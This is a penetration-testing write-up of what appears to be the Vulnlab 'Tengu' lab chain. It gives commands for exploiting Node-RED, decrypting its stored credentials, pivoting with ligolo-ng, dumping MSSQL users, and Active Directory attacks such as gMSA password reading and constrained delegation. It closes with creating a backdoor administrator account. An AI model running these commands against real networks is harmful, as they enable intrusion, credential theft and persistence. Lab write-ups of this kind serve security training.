
# NMAP

* Rust scan result
 
```console
Open 10.10.185.167:22
Open 10.10.185.167:1880
```

## Web

* Node-red web service can be exploited via [noderedsh.py](https://gist.githubusercontent.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297/raw/8966e4ee07400f16b92737161ca8df3cbfa37f91/noderedsh.py)

![image](https://github.com/reneanto/write-ups/assets/44943249/5def2930-6800-4a94-a52e-0a938e3747ed)
```bash
python3 noderedsh.py http://$IP:1080 --user "" --password ""
```

![nodered-svc](/Vulnlabs/Chains/Images/tengu-nodered.png)

### nodered_svc

* further exploring the nodered_svc directory, we come across `flows_cred.json` 
* according to this [article](https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/), we can get the `flows_cred.json` and the `.config.runtime.json` in to the folder `node_red_data` , then run the following script

```bash

#!/bin/bash
#
# Decrypt flows_cred.json from a NodeRED data directory
#
# Usage
# ./node-red-decrypt-flows-cred.sh ./node_red_data
#
jq  '.["$"]' -j $1/flows_cred.json | \
  cut -c 33- | \
  openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r '.["$"]' $1/flows_cred.json | cut -c 1-32` -K `jq -j '._credentialSecret' $1/.config.runtime.json | sha256sum | cut -c 1-64`
```

* upon running this we get the sql credentials that were found in the web application
## Pivoting

* navigate to /tmp on nodered as a good practice
* then use `ligolo-ng` to pivot

```bash
#on attacker machine
sudo ip tuntap add user rzgami mode tun ligolo
sudo ip link set ligolo up
./proxy --selfcert

#on nodered
./agent -connect $IP:11601 -ignore-cert

#on attacker machine
ligolo-ng>session
sudo ip route add 10.10.x.230/32 dev ligolo
sudo ip route add 10.10.x.229/32 dev ligolo
ligolo-ng>start
```

## MSSQL

* checking if the sqlsvc exists based on the credentials found in the machine node-red

```bash
nxc mssql 10.10.x.229-230 -U "nodered_connector" -P "" --local-auth
```

* logging in with impacket's `mssqclient`

```bash
impacket-mssqlclient tengu.vl\nodered_connector:pwd@$IP
```

* then enumerating the Database as

```bash
enum_db
select demo
select * from INFORMATION_SCHEMA.tables
select * from Users
```

![Tengu-Sql-Users](/Vulnlabs/Chains/Images/tengu-sql.png)

## Root on noderedsvc

* With the credentials from the sql database we can now login to the Linux machine Nodredsvc.

```bash
t2.m_winters@tengu.vl@nodredsvc.tengu.vl
sudo su
```

## Bloodhound

* With the same credentials we can extract information regarding the domain via `bloodhound`

```bash
bloodhound-python -u 't2.m_winters' -p 'pwd' -d 'tengu.vl' -dc 'dc.tengu.vk' -ns 10.10.x.229 -c all -zip
```

* Ingesting that data onto bloodhound and then using [bhqc](https://github.com/kaluche/bloodhound-quickwin) to get us brief overview over

```bash
python3 bhqc.py -u neo4j -p pwd -d TENGU.VL --heavy
```

![bhqc](/Vulnlabs/Chains/Images/tengu-bhqc.png)

## GMSA

* As suggested by the output above and with the help of [Pentester's-promiscuous-notebook](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos) , we can extract the krb5.keytab with [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) .

![krb5hash](/Vulnlabs/Chains/Images/tengu-krb5.png)

* Consulting the [Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword) for further exploiting the GMSA we can do

```bash
gMSADumper.py -u 'NODERED$' -p 'hash' -d 'tengu.vl'
which surprisingly gives an error
```

* so we move on with `nxc`

```bash
nxc ldap dc.tengu.vl -u 'NODERED$' -H 'hash' --gmsa
```

![gmsa](/Vulnlabs/Chains/Images/tengu-gmsa.png)

## Delegation

* Then again as per `bhqc` and [hacker recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/#recon) regarding delegation, we can get more info by running impacket's `findDelegation.py`

```bash
impacket-findDelegation.py "tengu.vl"/"gMSA01$":""@dc.tengu.vl -hashes ":hash"
```

![delegation](/Vulnlabs/Chains/Images/tengu-delegation.png)

* And as mentioned in [hacker recipes-KCD](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained) 

```bash
getST -spn "MSSQLSvc/tengu.vl" -impersonate "T1.M_WINTERS" "tengu.vl"/"gMSA01$":""@"dc.tengu.vl" --dc-ip 10.10.x.229
```

![getST](/Vulnlabs/Chains/Images/tengu-getST.png)

* we can export the ccache and use impacket's `mssqlclient ` to login with kerberos auth as

```bash
export KRB5CNAME=T1_M.WINTERS@MSSQLSvc_sql.tengu@TENGU.VL.ccache

impacket-mssqlclient -k sql.tengu.vl
```


## Ligolo outbound firewall

```
listener_add --addr 0.0.0.0:53 --to 10.8.2.42:53 --tcp
listener_add --addr 0.0.0.0:123 --to 10.8.2.42:123 --tcp
```

```powershell
New-LocalUser -Name "newadmin" -Password (ConvertTo-SecureString 'Password!' -AsPlainText -Force)  

Add-LocalGroupMember -Group "Administrators" -Member "newadmin"  
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
